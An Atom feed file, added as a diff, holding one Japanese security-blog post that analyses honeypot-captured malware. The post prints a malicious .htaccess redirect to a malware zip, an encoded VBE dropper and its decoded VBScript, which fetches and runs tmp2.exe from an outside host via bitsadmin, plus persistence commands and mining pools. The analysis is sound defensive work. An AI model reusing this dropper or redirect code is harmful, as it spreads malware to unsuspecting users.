@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title><![CDATA[csirt.mrtc0.log]]></title>
+  <subtitle><![CDATA[tail -f csirt.log]]></subtitle>
+  <link href="/atom.xml" rel="self"/>
+  <link href="https://csirt.mrtc0.com/"/>
+  <updated>2016-01-21T16:20:33.880Z</updated>
+  <id>https://csirt.mrtc0.com/</id>
+  
+  <author>
+    <name><![CDATA[mrtc0]]></name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[.htaccessで悪質なサイトへ誘導する手法]]></title>
+    <link href="https://csirt.mrtc0.com/uncategorized/cijogrc2y0000aucmurzqgtvj/"/>
+    <id>https://csirt.mrtc0.com/uncategorized/cijogrc2y0000aucmurzqgtvj/</id>
+    <published>2016-01-21T14:45:06.000Z</published>
+    <updated>2016-01-21T16:20:33.880Z</updated>
+    <content type="html"><![CDATA[<p>Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  </p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="keyword"><span class="common">RewriteEngine</span></span> <span class="literal">on</span> </span><br><span class="line"><span class="keyword"><span class="common">RewriteCond</span></span> <span class="cbracket">%&#123;HTTP_REFERER&#125;</span> ^(.*)google\.(.*) </span><br><span class="line"><span class="keyword"><span class="common">RewriteRule</span></span> .* http://testswork.ru/info.zip<span class="sqbracket"> [L]</span></span><br></pre></td></tr></table></figure>
+<p>Google検索経由でアクセスした場合, <a href="http://testwork.ru/info.zip" target="_blank" rel="external">http://testwork.ru/info.zip</a> へとアクセスさせています.  </p>
+<h4 id="testwork-ru"><a href="#testwork-ru" class="headerlink" title="testwork.ru"></a>testwork.ru</h4><h6 id="VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="VirusTotalでのスキャン結果"></a>VirusTotalでのスキャン結果</h6><ul>
+<li><a href="https://www.virustotal.com/ja/domain/testswork.ru/information/" target="_blank" rel="external">https://www.virustotal.com/ja/domain/testswork.ru/information/</a></li>
+</ul>
+<h6 id="urlQuery_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#urlQuery_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="urlQueryでのスキャン結果"></a>urlQueryでのスキャン結果</h6><ul>
+<li><a href="https://urlquery.net/report.php?id=1453389404756" target="_blank" rel="external">https://urlquery.net/report.php?id=1453389404756</a></li>
+</ul>
+<h4 id="info-zip"><a href="#info-zip" class="headerlink" title="info.zip"></a>info.zip</h4><table>
+<thead>
+<tr>
+<th style="text-align:center">filename</th>
+<th style="text-align:left">SHA256</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">info.zip</td>
+<td style="text-align:left">29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1</td>
+</tr>
+</tbody>
+</table>
+<h6 id="VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1"><a href="#VirusTotal_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1" class="headerlink" title="VirusTotalでのスキャン結果"></a>VirusTotalでのスキャン結果</h6><ul>
+<li><a href="https://www.virustotal.com/ja/file/29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1/analysis/1453388291/" target="_blank" rel="external">https://www.virustotal.com/ja/file/29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1/analysis/1453388291/</a></li>
+</ul>
+<p>info.zipの中にはinformation.vbeのみがありました.  </p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#<span class="variable">@~</span>^rAIAAA==Y~q/<span class="number">4</span>?V^~<span class="string">',Z.+mYn6(L+1O`?1.rwDRUtnVsE*@#@&amp;OPUY.nm:Px~;DnlDn&#125;4mD`Jzf&#125;9Ac?OlhE*@#@&amp;@#@&amp;q6PqdODvFjm.raY s!sVglhnBj^Mk2YcnX+EBF*@*!,K4nx,@#@&amp;Pd4Ut+^sR"Ex,E/?1DbwOPEEr[?1.kaY j1Dk2OwEsVgCs+'</span>rJrJ~Z),?<span class="number">1</span>DrwDR&#125;;bY<span class="variable">@#</span><span class="variable">@&amp;</span><span class="number">3</span>x9Pk6<span class="variable">@#</span><span class="variable">@&amp;</span><span class="variable">@#</span><span class="variable">@&amp;</span>KswxJYPAHK]<span class="string">'O:a  nX+J@#@&amp;`Ds'</span>r4DY2=zJY+kYkAWM3 D!zOha a+r<span class="variable">@#</span><span class="variable">@&amp;</span><span class="variable">@#</span><span class="variable">@&amp;</span><span class="number">3</span>m4W&#123;fG<span class="comment">//Gs:Cx9cJ1:[~JmP8rD/CNsrP&amp;DDmx/6+M~h4lO+7+.~r[jMs[rPJLPhwLJ,['PdOmDOPJ8Pr[Pha[J~',lOYMr(PQ4Pr[KswBfvZ!T!*@#@&amp;31tW&#123;9WkZWshCx9`rmhN~&amp;1Pnm4GD.GMPcT*,@*~cZ*cYaDJBF!Z!Zb@#@&amp;@#@Um.raYR5;kD@#@&amp;@#@&amp;oEmDkGx~9K//WshlNc^K::CU9~dna#@#@&amp;P,?+DPqdtA6nmd4Ut+^sRA6+1c^Ws:mx[#l~q?^Db2Yc?swPd+2),kt3X+1RDsrxmYn`*@#@&amp;~,fWk/Ws:l[ktA6nm jDN6ED l[)^V@#@&amp;3N~0!U1YrKxwcsAAA==^#~@]]`]&#125;])]]']]]]&#125;`'")'</span></span><br></pre></td></tr></table></figure>
+<p>このように難読化されていました.<br>この難読化には下記のツールが使用されたと思われます.  </p>
+<ul>
+<li><a href="https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c" target="_blank" rel="external">https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c</a></li>
+</ul>
+<p>デコードも可能であるため, 試したところ以下のようなVBスクリプトとなりました.  </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">Set</span> WshShell = CreateObject(<span class="string">"WScript.Shell"</span>)</span><br><span class="line"><span class="keyword">Set</span> Stream = CreateObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="keyword">Instr</span>(<span class="number">1</span>,WScript.FullName,<span class="string">"WScript.exe"</span>,<span class="number">1</span>)&gt;<span class="number">0</span> <span class="keyword">Then</span> </span><br><span class="line">  WshShell.Run <span class="string">"CScript """</span>&amp;WScript.ScriptFullName&amp;<span class="string">""""</span>,<span class="number">0</span>: WScript.Quit</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line">Tmp=<span class="string">"%TEMP%\tmp2.exe"</span></span><br><span class="line"><span class="keyword">Url</span>=<span class="string">"http://testswork.ru/tmp2.exe"</span></span><br><span class="line"></span><br><span class="line">Echo=DosCommand(<span class="string">"cmd /c bitsadmin /transfer whatever "</span>&amp;<span class="keyword">Url</span>&amp;<span class="string">" "</span>&amp;Tmp&amp;<span class="string">" &amp;&amp; start /b "</span>&amp;Tmp&amp;<span class="string">" &amp; attrib +h "</span>&amp;Tmp,<span class="number">360000</span>)</span><br><span class="line">Echo=DosCommand(<span class="string">"cmd /c echo error 404 &gt; 404.txt"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">WScript.Quit</span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> DosCommand(command,<span class="keyword">sleep</span>)</span><br><span class="line">  <span class="keyword">Set</span> WshExec=WshShell.Exec(command): WScript.<span class="keyword">Sleep</span> <span class="keyword">sleep</span>: WshExec.Terminate()</span><br><span class="line">  DosCommand=WshExec.StdOut.ReadAll</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">function</span></span></span><br></pre></td></tr></table></figure>
+<p>%TEMP%にtmp2.exeをダウンロードして実行する, いわゆるドロッパーですね.<br>attrib +h でファイルを隠したりもしてます.  </p>
+<h6 id="malwr-com_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#malwr-com_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="malwr.comでのスキャン結果"></a>malwr.comでのスキャン結果</h6><ul>
+<li><a href="https://malwr.com/analysis/NTQ1ZGQ5OGY2Mjk3NGMwZThjNjExMThlZmRlZTFlZTY/" target="_blank" rel="external">https://malwr.com/analysis/NTQ1ZGQ5OGY2Mjk3NGMwZThjNjExMThlZmRlZTFlZTY/</a></li>
+</ul>
+<h6 id="hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C"><a href="#hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C" class="headerlink" title="hybrid-analysisでのスキャン結果"></a>hybrid-analysisでのスキャン結果</h6><ul>
+<li><a href="https://www.hybrid-analysis.com/sample/26337534fb67553e07eb6568cd272153120d6b2b565148392e8a13287f367a5e?environmentId=1" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/26337534fb67553e07eb6568cd272153120d6b2b565148392e8a13287f367a5e?environmentId=1</a></li>
+</ul>
+<h4 id="tmp2-exe"><a href="#tmp2-exe" class="headerlink" title="tmp2.exe"></a>tmp2.exe</h4><p>すでにtmp2.exeはダウンロードできなくなっていましたが, オンラインスキャナに上がっていました.  </p>
+<p>FTPサーバーを立てたりIMG001.exeをダウンロードしてます.<br>ダウンロードしたIMG001.exeは HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run などのレジストリや schtasks /create /tn “UAC” /SC ONLOGON /F /RL HIGHEST /TR のようなコマンドでスケジューラに登録して自動起動するようにされます.<br>また, powercfg.exeで電源設定などを変更するようです.  </p>
+<h6 id="hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1"><a href="#hybrid-analysis_u3067_u306E_u30B9_u30AD_u30E3_u30F3_u7D50_u679C-1" class="headerlink" title="hybrid-analysisでのスキャン結果"></a>hybrid-analysisでのスキャン結果</h6><ul>
+<li><a href="https://www.hybrid-analysis.com/sample/5616b94f1a40b49096e2f8f78d646891b45c649473a5b67b8beddac46ad398e1?environmentId=1" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/5616b94f1a40b49096e2f8f78d646891b45c649473a5b67b8beddac46ad398e1?environmentId=1</a></li>
+</ul>
+<h4 id="IMG001-exe"><a href="#IMG001-exe" class="headerlink" title="IMG001.exe"></a>IMG001.exe</h4><p>Bitcoin Minerだったり, Trojanだったりいくつかあるようです.<br><a href="https://www.hybrid-analysis.com/search?query=IMG001.exe" target="_blank" rel="external">https://www.hybrid-analysis.com/search?query=IMG001.exe</a>  </p>
+<p>pools.txtというテキストファイルにはBitcoinのプールのアドレスが記述されていました.  </p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.moneropool.com:8080</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.moneropool.com:3336</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.hashinvest.net:443</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.hashinvest.net:5555</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//monero.crypto-pool.fr:3333</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//monerohash.com:5555</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.xmr.unipool.pro:3333</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.prohash.net:5555</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//xmr.miner.center:2777</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mine.xmr.unipool.pro:80</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//pool.minexmr.com:7777</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//cryptonotepool.org.uk:7777</span></span><br><span class="line">stratum+<span class="string">tcp:</span><span class="comment">//mro.poolto.be:3000</span></span><br></pre></td></tr></table></figure>
+<p>これらのファイルは「Nullsoft Installer」で作成されており, 展開することができます.  </p>
+<h4 id="u53C2_u8003"><a href="#u53C2_u8003" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a href="http://csirt.ninja/?p=280" target="_blank" rel="external">ハニーポットにFTP経由で設置されたファイル調査メモ (2016/01/20) - (n)inja csirt</a></li>
+</ul>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  </p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line]]>
+    </summary>
+    
+      <category term="dionaea" scheme="https://csirt.mrtc0.com/tags/dionaea/"/>
+    
+      <category term="honeypot" scheme="https://csirt.mrtc0.com/tags/honeypot/"/>
+    
+  </entry>
+  
+</feed>
